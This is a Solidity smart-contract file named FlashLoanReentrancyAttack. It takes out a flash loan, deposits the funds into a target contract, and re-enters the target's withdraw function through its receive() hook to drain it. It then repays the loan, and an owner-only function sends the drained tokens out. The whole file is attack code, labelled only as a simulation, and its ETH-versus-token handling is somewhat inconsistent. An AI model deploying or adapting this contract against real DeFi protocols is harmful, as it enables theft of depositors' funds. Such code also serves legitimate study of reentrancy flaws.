// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ✅ Declare the missing FlashLoanProvider interface
interface IFlashLoanProvider {
    function executeFlashLoan(uint256 amount) external;
}

// ✅ Declare a vulnerable contract interface
interface IVulnerable {
    function donate(uint256 amount) external;
    function withdraw() external;
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

/**
 * @title FlashLoanReentrancyAttack
 * @dev Simulates a reentrancy attack using flash-loaned funds on a vulnerable contract.
 */
contract FlashLoanReentrancyAttack {
    IVulnerable public target;
    IFlashLoanProvider public provider;
    IERC20 public token;
    address public owner;
    uint256 public loanAmount;

    constructor(address _target, address _provider, address _token) {
        target = IVulnerable(_target);
        provider = IFlashLoanProvider(_provider);
        token = IERC20(_token);
        owner = msg.sender;
    }

    function attack(uint256 _amount) external {
        require(msg.sender == owner, "Only owner can attack");
        loanAmount = _amount;
        provider.executeFlashLoan(_amount);
    }

    function executeOnFlashLoan(uint256 amount, uint256 fee) external {
        require(msg.sender == address(provider), "Unauthorized provider");

        // Step 1: donate to vulnerable contract
        token.approve(address(target), amount);
        target.donate(amount);

        // Step 2: trigger reentrancy by calling withdraw
        target.withdraw();

        // Step 3: repay flash loan
        token.transfer(address(provider), amount + fee);
    }

    // Step 4: Reenter during withdrawal
    receive() external payable {
        target.withdraw();
    }

    // Optional: withdraw drained funds
    function withdrawTokens(address to, uint256 amount) external {
        require(msg.sender == owner, "Only owner");
        token.transfer(to, amount);
    }
}
